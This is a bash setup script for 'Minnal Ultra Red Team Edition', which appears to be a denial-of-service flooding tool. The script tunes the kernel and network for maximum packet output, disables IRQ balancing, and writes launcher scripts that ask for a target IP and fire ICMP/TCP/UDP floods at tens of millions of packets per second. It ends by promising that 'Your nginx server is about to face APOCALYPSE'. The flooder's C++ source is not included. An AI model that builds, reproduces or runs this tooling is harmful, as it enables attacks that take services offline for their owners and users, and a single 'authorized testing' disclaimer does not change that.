#!/bin/bash
#
# MINNAL ULTRA ENTERPRISE RED TEAM EDITION
# Complete Setup & Installation Script - FIXED VERSION
#

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

echo -e "${RED}${BOLD}"
cat << 'BANNER_EOF'
    ███╗   ███╗██╗███╗   ██╗███╗   ██╗ █████╗ ██╗     
    ████╗ ████║██║████╗  ██║████╗  ██║██╔══██╗██║     
    ██╔████╔██║██║██╔██╗ ██║██╔██╗ ██║███████║██║     
    ██║╚██╔╝██║██║██║╚██╗██║██║╚██╗██║██╔══██║██║     
    ██║ ╚═╝ ██║██║██║ ╚████║██║ ╚████║██║  ██║███████╗
    ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝
BANNER_EOF
echo -e "${NC}"
echo -e "${YELLOW}    ULTRA ENTERPRISE RED TEAM EDITION v6.0${NC}"
echo -e "${CYAN}    Complete Installation & System Optimization${NC}"
echo ""

if [ "$EUID" -ne 0 ]; then 
    echo -e "${RED}[✗] Please run as root (use sudo)${NC}"
    exit 1
fi

INSTALL_DIR="/opt/minnal-ultra"

echo -e "${GREEN}[1/6] Installing dependencies...${NC}"
if command -v apt-get &> /dev/null; then
    apt-get update -qq 2>&1 | grep -v "^Reading" || true
    apt-get install -y -qq build-essential g++ make wget curl net-tools ethtool 2>&1 | grep -v "^Selecting" || true
elif command -v yum &> /dev/null; then
    yum groupinstall -y -q "Development Tools" 2>&1 | grep -v "^Package" || true
    yum install -y -q gcc-c++ make wget curl net-tools 2>&1 | grep -v "^Package" || true
fi
echo -e "${GREEN}[✓] Dependencies installed${NC}"

echo -e "${GREEN}[2/6] Creating installation directory...${NC}"
mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"
echo -e "${GREEN}[✓] Created $INSTALL_DIR${NC}"

echo -e "${GREEN}[3/6] Optimizing system for maximum performance...${NC}"

# Network optimizations
cat > /etc/sysctl.d/99-minnal-ultra.conf << 'SYSCTL_END'
net.core.rmem_max = 268435456
net.core.wmem_max = 268435456
net.core.rmem_default = 268435456
net.core.wmem_default = 268435456
net.ipv4.tcp_rmem = 4096 87380 268435456
net.ipv4.tcp_wmem = 4096 65536 268435456
net.core.netdev_max_backlog = 500000
net.core.somaxconn = 131072
net.ipv4.tcp_max_syn_backlog = 16384
net.ipv4.ip_local_port_range = 1024 65535
net.ipv4.tcp_tw_reuse = 1
net.ipv4.tcp_fin_timeout = 10
net.ipv4.tcp_keepalive_time = 300
net.ipv4.tcp_keepalive_probes = 5
net.ipv4.tcp_keepalive_intvl = 15
fs.file-max = 4194304
fs.nr_open = 4194304
net.ipv4.neigh.default.gc_thresh1 = 8192
net.ipv4.neigh.default.gc_thresh2 = 32768
net.ipv4.neigh.default.gc_thresh3 = 65536
net.ipv4.tcp_mem = 786432 1048576 26777216
net.ipv4.udp_mem = 786432 1048576 26777216
kernel.sched_min_granularity_ns = 10000000
kernel.sched_wakeup_granularity_ns = 15000000
vm.swappiness = 10
SYSCTL_END

sysctl -p /etc/sysctl.d/99-minnal-ultra.conf > /dev/null 2>&1
echo -e "${GREEN}[✓] Network optimizations applied${NC}"

# CPU optimizations
for gov in /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor; do
    if [ -f "$gov" ]; then
        echo performance > "$gov" 2>/dev/null || true
    fi
done
echo -e "${GREEN}[✓] CPU governor set to performance${NC}"

# System limits
cat >> /etc/security/limits.conf << 'LIMITS_END'

# Minnal Ultra limits
* soft nofile 4194304
* hard nofile 4194304
* soft nproc 4194304
* hard nproc 4194304
* soft memlock unlimited
* hard memlock unlimited
LIMITS_END
echo -e "${GREEN}[✓] System limits increased${NC}"

# Disable IRQ balance
systemctl stop irqbalance 2>/dev/null || true
systemctl disable irqbalance 2>/dev/null || true
echo -e "${GREEN}[✓] IRQ balance disabled${NC}"

echo -e "${GREEN}[4/6] Creating system optimization script...${NC}"
cat > "$INSTALL_DIR/optimize-system.sh" << 'OPT_END'
#!/bin/bash
echo "[*] Applying runtime optimizations..."

for cpu in /sys/devices/system/cpu/cpu*/cpuidle/state*/disable; do
    [ -f "$cpu" ] && echo 1 > "$cpu" 2>/dev/null || true
done

for iface in $(ls /sys/class/net/ 2>/dev/null | grep -v lo); do
    ethtool -G "$iface" rx 4096 tx 4096 2>/dev/null || true
    ethtool -K "$iface" gso off gro off tso off 2>/dev/null || true
    ip link set dev "$iface" txqueuelen 10000 2>/dev/null || true
done

swapoff -a 2>/dev/null || true
sync && echo 3 > /proc/sys/vm/drop_caches 2>/dev/null || true

echo "[✓] Runtime optimizations complete"
OPT_END
chmod +x "$INSTALL_DIR/optimize-system.sh"
echo -e "${GREEN}[✓] Created optimize-system.sh${NC}"

echo -e "${GREEN}[5/6] Creating launch scripts...${NC}"

cat > "$INSTALL_DIR/launch.sh" << 'LAUNCH_END'
#!/bin/bash
cd /opt/minnal-ultra

echo "=================================="
echo "Minnal Ultra Quick Launch"
echo "=================================="
echo ""
echo "Enter target IP:"
read TARGET
echo "Enter target ports (e.g., 80,443):"
read PORTS
echo ""
echo "Select mode:"
echo "  1) Lab Testing (5-10M pps)"
echo "  2) Production (10-20M pps)"
echo "  3) Red Team Maximum (20-30M+ pps)"
echo ""
read -p "Choice [1-3]: " CHOICE

case $CHOICE in
    1) MODE="--lab" ;;
    2) MODE="--production" ;;
    3) MODE="--redteam" ;;
    *) MODE="--lab" ;;
esac

echo ""
echo "Launching..."
sudo ./minnal -t "$TARGET" -p "$PORTS" $MODE --affinity --adaptive
LAUNCH_END
chmod +x "$INSTALL_DIR/launch.sh"

cat > "$INSTALL_DIR/redteam.sh" << 'RED_END'
#!/bin/bash
cd /opt/minnal-ultra

echo "🔥🔥🔥 RED TEAM MAXIMUM POWER 🔥🔥🔥"
echo ""
echo "Target IP:"
read TARGET
echo "Ports:"
read PORTS
echo ""
echo "⚠️  WARNING: This will unleash MAXIMUM POWER!"
echo "Type 'ENGAGE' to confirm:"
read CONFIRM

if [ "$CONFIRM" = "ENGAGE" ]; then
    echo ""
    echo "Optimizing system..."
    ./optimize-system.sh
    echo ""
    echo "Launching RED TEAM attack..."
    sudo ./minnal -t "$TARGET" -p "$PORTS" --redteam --affinity --adaptive
else
    echo "Cancelled."
fi
RED_END
chmod +x "$INSTALL_DIR/redteam.sh"

echo -e "${GREEN}[✓] Launch scripts created${NC}"

echo -e "${GREEN}[6/6] Creating compilation script...${NC}"

cat > "$INSTALL_DIR/compile.sh" << 'COMPILE_END'
#!/bin/bash
echo "Compiling Minnal Ultra with maximum optimizations..."

if [ ! -f minnal.cpp ]; then
    echo "Error: minnal.cpp not found!"
    echo "Please create minnal.cpp with the source code first."
    exit 1
fi

g++ -std=c++17 -O3 -march=native -mtune=native -flto -ffast-math \
    -pthread minnal.cpp -o minnal 2>&1
    
if [ $? -eq 0 ]; then
    echo "✓ Compilation successful!"
    ln -sf /opt/minnal-ultra/minnal /usr/local/bin/minnal 2>/dev/null || true
    echo "✓ Symlink created"
    echo ""
    echo "Test it: sudo minnal --help"
else
    echo "✗ Compilation failed"
    echo "Check if g++ version is 7.0 or higher: g++ --version"
    exit 1
fi
COMPILE_END
chmod +x "$INSTALL_DIR/compile.sh"

cat > "$INSTALL_DIR/README.txt" << 'README_END'
═══════════════════════════════════════════════════════════
    MINNAL ULTRA ENTERPRISE RED TEAM EDITION v6.0
═══════════════════════════════════════════════════════════

NEXT STEPS:

1. Copy the C++ source code:
   nano /opt/minnal-ultra/minnal.cpp
   [Paste the complete code from minnal_ultra_enterprise artifact]
   [Save: Ctrl+X, Y, Enter]

2. Compile:
   cd /opt/minnal-ultra
   ./compile.sh

3. Launch:
   ./launch.sh          # Interactive launcher
   ./redteam.sh         # Red team maximum power

QUICK START:
    sudo minnal -t 192.168.1.100 -p 80,443 --redteam --affinity --adaptive

PRESETS:
    --lab         Lab testing (moderate)
    --production  Production stress test
    --redteam     Maximum power (256+ threads)

EXAMPLES:

  Lab Testing:
    sudo minnal -t 192.168.1.100 -p 80 --lab --duration 60

  Production Stress:
    sudo minnal -t 192.168.1.100 -p 80,443 --production --affinity

  Red Team Full Power:
    sudo minnal -t 192.168.1.100 -p 80,443,8080 --redteam --affinity --adaptive

  Custom Configuration:
    sudo minnal -t 192.168.1.100 -p 80 \
      --icmp 256 --tcp 128 --udp 192 --affinity --adaptive

EXPECTED PERFORMANCE:
    Lab Mode:       5-10 Million packets/sec
    Production:     10-20 Million packets/sec
    Red Team:       20-30+ Million packets/sec

FEATURES:
    ✓ 50 sockets per thread (massive parallelism)
    ✓ Advanced burst sizing (2048 packets/burst)
    ✓ CPU affinity and real-time scheduling
    ✓ Adaptive rate control (prevent packet drop)
    ✓ Zero-copy transmission
    ✓ Hardware offload support
    ✓ Real-time performance analytics
    ✓ Progress tracking vs targets

SYSTEM OPTIMIZATIONS APPLIED:
    ✓ 256MB network buffers
    ✓ 4M file limit
    ✓ CPU performance mode
    ✓ IRQ balance disabled
    ✓ Network offloading configured

FILES:
    /opt/minnal-ultra/minnal              - Main executable
    /opt/minnal-ultra/launch.sh           - Interactive launcher
    /opt/minnal-ultra/redteam.sh          - Red team mode
    /opt/minnal-ultra/optimize-system.sh  - Runtime optimizations
    /opt/minnal-ultra/compile.sh          - Compilation script
    /usr/local/bin/minnal                 - Global symlink

VERIFY INSTALLATION:
    sudo minnal --help

TROUBLESHOOTING:
    - Low packet rate: Use --affinity and --adaptive flags
    - Compilation errors: Check g++ version (need 7.0+)
    - Permission denied: Run with sudo
    - Network saturated: This is expected at high rates!

LEGAL WARNING:
    ⚠️  FOR AUTHORIZED TESTING ONLY ⚠️
    Use only on systems you own or have permission to test.
    Unauthorized use is illegal and punishable by law.

═══════════════════════════════════════════════════════════
README_END

echo -e "${GREEN}[✓] All files created${NC}"

echo ""
echo -e "${GREEN}${BOLD}═══════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}${BOLD}         MINNAL ULTRA SETUP COMPLETE!${NC}"
echo -e "${GREEN}${BOLD}═══════════════════════════════════════════════════════════${NC}"
echo ""
echo -e "${YELLOW}NEXT STEPS:${NC}"
echo -e "1. Copy C++ source code to: ${BOLD}$INSTALL_DIR/minnal.cpp${NC}"
echo -e "2. Compile: ${BOLD}cd $INSTALL_DIR && ./compile.sh${NC}"
echo -e "3. Launch: ${BOLD}./launch.sh${NC} or ${BOLD}./redteam.sh${NC}"
echo ""
echo -e "${CYAN}Quick command sequence:${NC}"
echo -e "${BOLD}cd $INSTALL_DIR${NC}"
echo -e "${BOLD}nano minnal.cpp${NC}"
echo -e "${CYAN}[Paste code, Ctrl+X, Y, Enter]${NC}"
echo -e "${BOLD}./compile.sh${NC}"
echo -e "${BOLD}sudo ./minnal --help${NC}"
echo ""
echo -e "${GREEN}Installation directory: ${BOLD}$INSTALL_DIR${NC}"
echo -e "${GREEN}Documentation: ${BOLD}cat $INSTALL_DIR/README.txt${NC}"
echo ""
echo -e "${RED}${BOLD}TARGET PERFORMANCE:${NC}"
echo -e "  ${RED}• 20 MILLION ICMP/sec${NC}"
echo -e "  ${YELLOW}• 5 MILLION UDP/sec${NC}"
echo -e "  ${GREEN}• 500,000 TCP/sec${NC}"
echo ""
echo -e "${YELLOW}Your nginx server is about to face APOCALYPSE! 🔥💥${NC}"
echo ""
